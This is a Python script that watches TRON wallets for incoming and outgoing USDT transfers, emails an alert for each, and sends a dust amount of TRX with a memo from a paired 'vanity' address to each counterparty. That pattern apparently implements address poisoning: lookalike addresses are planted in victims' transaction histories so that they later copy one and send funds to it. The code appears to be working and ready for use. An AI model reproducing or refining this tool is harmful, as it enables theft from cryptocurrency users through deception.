import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal

# Load .env config
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")

USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER]):
    print("Missing email config.")
    exit(1)
if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses, or keys.")
    exit(1)

client = Tron(HTTPProvider(endpoint_uri="https://api.tronstack.io"))
last_tx_ids = {}

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"Error checking contract address: {e}")
        return False

def get_latest_trc20_transaction(wallet_address):
    try:
        url = f"https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=1&sort=-timestamp&filterTokenValue=1&relatedAddress={wallet_address}&token={USDT_CONTRACT_ADDRESS}"
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            print(f"Tronscan API failed. Status: {response.status_code}")
            return None
        data = response.json()
        txs = data.get("data", [])
        return txs[0] if txs else None
    except Exception as e:
        print(f"Error fetching TRC20 transfer: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("✅ Email sent.")
    except Exception as e:
        print("❌ Failed to send email:", e)

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        print(f"Freezing {freeze_amount} TRX for bandwidth on address: {address}")
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = (
            client.trx.freeze_balance(
                owner_address=address,
                amount=int(freeze_amount * 1_000_000),
                duration=3,
                resource="BANDWIDTH"
            ).build().sign(priv_key)
        )
        result = txn.broadcast().wait()
        print("✅ Freeze success. TxID:", result.get("id", "n/a"))
    except Exception as e:
        print("❌ Failed to freeze TRX:", e)

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            print(f"Skipping: {to_address} is a contract address.")
            return

        print(f"Sending {amount} TRX from {from_address} to {to_address}")
        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)

        if balance < amount:
            print("⚠️ Not enough TRX. Attempting to freeze for bandwidth...")
            freeze_trx_for_bandwidth(from_address, priv_key_hex)
            return

        txn = (
            client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
            .memo(f"Thanks for interacting with {from_address}")
            .build().sign(priv_key)
        )
        result = txn.broadcast().wait()
        print(f"✅ TRX sent. TxID: {result.get('id', 'n/a')}")
    except Exception as e:
        print("❌ Failed to send TRX:", e)

print("🚀 USDT TRC20 monitor started...")

while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            print(f"🔍 Checking address: {my_address}")
            tx = get_latest_trc20_transaction(my_address)

            if tx:
                tx_id = tx.get("transaction_id")
                if last_tx_ids.get(my_address) == tx_id:
                    print("⏸ No new transaction.")
                    continue

                last_tx_ids[my_address] = tx_id

                sender = tx.get("from")
                receiver = tx.get("to")
                amount = Decimal(tx.get("value", "0")) / Decimal("1e6")

                if sender == USDT_CONTRACT_ADDRESS or receiver == USDT_CONTRACT_ADDRESS:
                    print("❌ Ignoring USDT contract interaction.")
                    continue

                interacting_address = sender if receiver == my_address else receiver

                if interacting_address in WALLET_ADDRESSES or interacting_address in VANITY_ADDRESSES:
                    print(f"⚠️ Skipping internal/system address: {interacting_address}")
                    continue

                if is_contract_address(interacting_address):
                    print(f"⚠️ Skipping contract address: {interacting_address}")
                    continue

                print(f"✅ New USDT transaction detected: {amount} USDT from {sender} to {receiver}")
                subject = f"USDT Transfer to {my_address}"
                body = f"""
New USDT transfer detected:

Monitored Wallet: {my_address}
Amount: {amount} USDT
Sender: {sender}
Receiver: {receiver}
TxID: {tx_id}
🔗 https://tronscan.org/#/transaction/{tx_id}
"""
                send_email(subject, body)
                send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)

            else:
                print("⏸ No transaction found.")
            time.sleep(1)

    except Exception as e:
        print("❌ Monitoring error:", e)

    print("🕒 Sleeping for 30s...\n")
    time.sleep(30)
